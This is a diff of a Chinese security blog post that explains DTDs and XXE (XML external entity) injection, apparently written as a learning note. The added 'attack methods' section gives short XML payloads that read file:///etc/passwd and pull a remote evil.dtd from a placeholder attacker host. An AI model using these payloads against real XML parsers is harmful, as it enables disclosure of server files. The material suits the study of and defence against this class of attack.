@@ -27,11 +27,13 @@
 <meta property="og:site_name" content="blueSatchel&#39;s blog">
 <meta property="og:description" content="xxe">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/xxe/image-20211225130238479.png">
 <meta property="article:published_time" content="2021-12-24T13:46:28.000Z">
-<meta property="article:modified_time" content="2021-12-24T17:13:19.667Z">
+<meta property="article:modified_time" content="2021-12-25T05:05:49.533Z">
 <meta property="article:author" content="blueSatchel">
 <meta property="article:tag" content="xxe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/xxe/image-20211225130238479.png">
 
 <link rel="canonical" href="http://example.com/2021/12/24/xxe/">
 
@@ -224,7 +226,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-12-25 01:13:19" itemprop="dateModified" datetime="2021-12-25T01:13:19+08:00">2021-12-25</time>
+                <time title="修改时间：2021-12-25 13:05:49" itemprop="dateModified" datetime="2021-12-25T13:05:49+08:00">2021-12-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -261,6 +263,8 @@
 <p>文件名xxe.dtd</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT 班级 (学生+)&gt;</span><br><span class="line">&lt;!ELEMENT 学生 (名字,年龄,介绍)&gt;</span><br><span class="line">&lt;!ELEMENT 名字 (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT 年龄 (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT 介绍 (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>
 
+<h5 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h5><p>PCDATA 的意思是被解析的字符数据（parsed character data）。<br>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</p>
+<h5 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h5><p>CDATA 的意思是字符数据（character data）。<br>CDATA 是不会被解析器解析的文本。</p>
 <h5 id="XML示例"><a href="#XML示例" class="headerlink" title="XML示例"></a>XML示例</h5><p>班级为根元素</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 班级 <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;xxe.dtd&quot;</span>&gt;</span></span><br><span class="line">&lt;班级&gt;</span><br><span class="line">	&lt;学生&gt;</span><br><span class="line">        &lt;名字&gt;张三&lt;/名字&gt;</span><br><span class="line">        &lt;年龄&gt;19&lt;/年龄&gt;</span><br><span class="line">        &lt;介绍&gt;好孩子&lt;/介绍&gt;</span><br><span class="line">    &lt;/学生&gt;</span><br><span class="line">    &lt;学生&gt;</span><br><span class="line">        &lt;名字&gt;小明&lt;/名字&gt;</span><br><span class="line">        &lt;年龄&gt;21&lt;/年龄&gt;</span><br><span class="line">        &lt;介绍&gt;学习认真&lt;/介绍&gt;</span><br><span class="line">    &lt;/学生&gt;</span><br><span class="line">&lt;/班级&gt;</span><br></pre></td></tr></table></figure>
 
@@ -280,6 +284,23 @@
 <h5 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h5><p>参数实体只能在DTD文档中定义,DTD中引用</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">neo</span>[</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">neo</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xxx.xxx.xxx/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%xxe;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">neo</span>&gt;</span><span class="symbol">&amp;evil;</span><span class="tag">&lt;/<span class="name">neo</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
+<h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4><h5 id="直接通过DTD外部实体声明"><a href="#直接通过DTD外部实体声明" class="headerlink" title="直接通过DTD外部实体声明"></a>直接通过DTD外部实体声明</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">neo</span>[</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="通过DTD文档引入外部DTD文档-再引入外部实体声明"><a href="#通过DTD文档引入外部DTD文档-再引入外部实体声明" class="headerlink" title="通过DTD文档引入外部DTD文档,再引入外部实体声明"></a>通过DTD文档引入外部DTD文档,再引入外部实体声明</h5><p>xml内容</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">neo</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;dtd文档url&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>dtd内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过参数实体</p>
+<p>先写一个外部实体声明,然后引用在攻击者服务器上面的外部实体声明</p>
+<p>xml内容</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY %d <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xxx.xxx/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%d;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>dtd文件内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="协议支持"><a href="#协议支持" class="headerlink" title="协议支持"></a>协议支持</h4><p><img src="/images/xxe/image-20211225130238479.png" alt="image-20211225130238479"></p>
 
     </div>
 
@@ -301,7 +322,10 @@
     <a href="/2021/12/24/%E6%8E%A5%E5%8F%A3/" rel="prev" title="接口">
       <i class="fa fa-chevron-left"></i> 接口
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2021/12/25/xxe%E9%A2%98%E7%9B%AE/" rel="next" title="xxe题目">
+      xxe题目 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -360,7 +384,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#xxe"><span class="nav-number">1.</span> <span class="nav-text">xxe</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DTD"><span class="nav-number">1.1.</span> <span class="nav-text">DTD</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#DTD%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.1.1.</span> <span class="nav-text">DTD示例</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#XML%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.1.2.</span> <span class="nav-text">XML示例</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E6%93%8D%E4%BD%9C"><span class="nav-number">1.2.</span> <span class="nav-text">具体操作</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-lt-DOCTYPE-%E6%96%87%E6%A1%A3%E7%B1%BB%E5%9E%8B%E5%90%8D%E7%A7%B0-SYSTEM-quot-DTD%E6%96%87%E6%A1%A3%E7%9A%84URL-quot-gt"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.&lt;!DOCTYPE 文档类型名称 SYSTEM  &quot;DTD文档的URL&quot;&gt;</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-lt-DOCTYPE-%E6%96%87%E6%A1%A3%E7%B1%BB%E5%9E%8B%E5%90%8D%E7%A7%B0-PUBLIC-quot-DTD%E5%90%8D%E7%A7%B0-quot-quot-DTD%E6%96%87%E4%BB%B6%E7%9A%84URL-quot-gt"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.&lt;!DOCTYPE 文档类型名称 PUBLIC &quot;DTD名称&quot; &quot;DTD文件的URL&quot;&gt;</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%85%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="nav-number">1.2.3.</span> <span class="nav-text">内部实体</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="nav-number">1.2.4.</span> <span class="nav-text">外部实体</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="nav-number">1.2.5.</span> <span class="nav-text">参数实体</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#xxe"><span class="nav-number">1.</span> <span class="nav-text">xxe</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DTD"><span class="nav-number">1.1.</span> <span class="nav-text">DTD</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#DTD%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.1.1.</span> <span class="nav-text">DTD示例</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PCDATA"><span class="nav-number">1.1.2.</span> <span class="nav-text">PCDATA</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#CDATA"><span class="nav-number">1.1.3.</span> <span class="nav-text">CDATA</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#XML%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.1.4.</span> <span class="nav-text">XML示例</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E6%93%8D%E4%BD%9C"><span class="nav-number">1.2.</span> <span class="nav-text">具体操作</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-lt-DOCTYPE-%E6%96%87%E6%A1%A3%E7%B1%BB%E5%9E%8B%E5%90%8D%E7%A7%B0-SYSTEM-quot-DTD%E6%96%87%E6%A1%A3%E7%9A%84URL-quot-gt"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.&lt;!DOCTYPE 文档类型名称 SYSTEM  &quot;DTD文档的URL&quot;&gt;</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-lt-DOCTYPE-%E6%96%87%E6%A1%A3%E7%B1%BB%E5%9E%8B%E5%90%8D%E7%A7%B0-PUBLIC-quot-DTD%E5%90%8D%E7%A7%B0-quot-quot-DTD%E6%96%87%E4%BB%B6%E7%9A%84URL-quot-gt"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.&lt;!DOCTYPE 文档类型名称 PUBLIC &quot;DTD名称&quot; &quot;DTD文件的URL&quot;&gt;</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%85%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="nav-number">1.2.3.</span> <span class="nav-text">内部实体</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="nav-number">1.2.4.</span> <span class="nav-text">外部实体</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="nav-number">1.2.5.</span> <span class="nav-text">参数实体</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="nav-number">1.3.</span> <span class="nav-text">攻击方式</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E9%80%9A%E8%BF%87DTD%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E5%A3%B0%E6%98%8E"><span class="nav-number">1.3.1.</span> <span class="nav-text">直接通过DTD外部实体声明</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%80%9A%E8%BF%87DTD%E6%96%87%E6%A1%A3%E5%BC%95%E5%85%A5%E5%A4%96%E9%83%A8DTD%E6%96%87%E6%A1%A3-%E5%86%8D%E5%BC%95%E5%85%A5%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E5%A3%B0%E6%98%8E"><span class="nav-number">1.3.2.</span> <span class="nav-text">通过DTD文档引入外部DTD文档,再引入外部实体声明</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8D%8F%E8%AE%AE%E6%94%AF%E6%8C%81"><span class="nav-number">1.4.</span> <span class="nav-text">协议支持</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -376,7 +400,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-count">14</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -389,7 +413,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
